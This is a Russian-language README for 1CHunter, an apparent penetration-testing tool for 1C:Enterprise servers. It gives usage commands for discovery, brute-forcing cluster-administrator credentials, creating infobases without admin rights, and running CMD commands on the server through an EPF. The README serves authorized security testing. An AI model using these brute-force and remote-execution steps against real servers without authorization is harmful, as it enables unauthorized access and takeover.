# 1CHunter

Консольная утилита для проверки безопасности серверов 1С:Предприятие через `ragent:1540` и протоколы кластера.

Работает на Linux и собирается в один статический бинарник — Java, Python, RAS и дополнительные библиотеки 1С не требуются. Исходный код на Go.

## Возможности

- Обнаружение сервисов 1С на заданных портах.
- Автоопределение версии платформы, кластеров, портов и информационных баз.
- Проверка наличия администратора для каждого кластера.
- Проверка одного сервера или списка серверов с разными версиями.
- Перебор учётных данных администратора кластера с прогрессом и ограничением скорости.
- Создание ИБ и базы PostgreSQL при отсутствии администратора кластера.
- Выполнение CMD-команд на Windows-сервере 1С через встроенную EPF.
- Relay для записи и анализа протокола.

Проверено на `8.3.23.1782` и `8.3.27.1786/1859`. Создание ИБ и выполнение EPF пока поддерживается только на линейке `8.3.27`. Поддержка MSSQL заявлена в интерфейсе, но не проверена.

## Сборка

Требуется Go 1.24:

```bash
./build.sh
```

Скрипт запускает `go test ./...` и создаёт `dist/1chunter`.

## Основные команды

```bash
# Обнаружение сервисов
./dist/1chunter discover --target 192.168.153.138

# Аудит одного сервера
./dist/1chunter agent inspect --target 192.168.153.138

# Аудит списка серверов, по одному IP на строку
./dist/1chunter agent inspect --target-list targets.txt

# Перебор учётных данных администратора кластера
./dist/1chunter agent brute \
  --target 192.168.153.131 \
  --cluster 'АфкКластер' \
  --users users.txt \
  --passwords passwords.txt \
  --delay 20ms

# Создание ИБ и базы PostgreSQL
export ONECHUNTER_DB_PASSWORD='пароль_СУБД'
./dist/1chunter infobase --create \
  --target 192.168.153.131 \
  --cluster 'КластерНовый' \
  --name hunter_test \
  --description test \
  --dbms postgres \
  --db-host 192.168.153.131 \
  --db-name hunter_test \
  --db-user postgres \
  --confirm-create

# Выполнение команды на сервере 1С через EPF
./dist/1chunter infobase exec \
  --target 192.168.153.138 \
  --cluster 'Локальный кластер' \
  --infobase infosec \
  --command hostname
```

Для `infobase exec` можно не передавать NTLM-учётные данные: имя рабочей станции и пароль будут сгенерированы. При необходимости задайте их явно:

```bash
export ONECHUNTER_AGENT_PASSWORD='пароль'
./dist/1chunter infobase exec \
  --target 192.168.153.138 \
  --agent-user 'user@HOST' \
  --workstation HOST \
  --cluster 'Локальный кластер' \
  --infobase infosec \
  --command hostname
```

Полный список параметров доступен через `./dist/1chunter help`.

## Предупреждение

Используйте утилиту только на своих системах или при наличии разрешения на тестирование. Создание ИБ и выполнение команд изменяет состояние сервера.
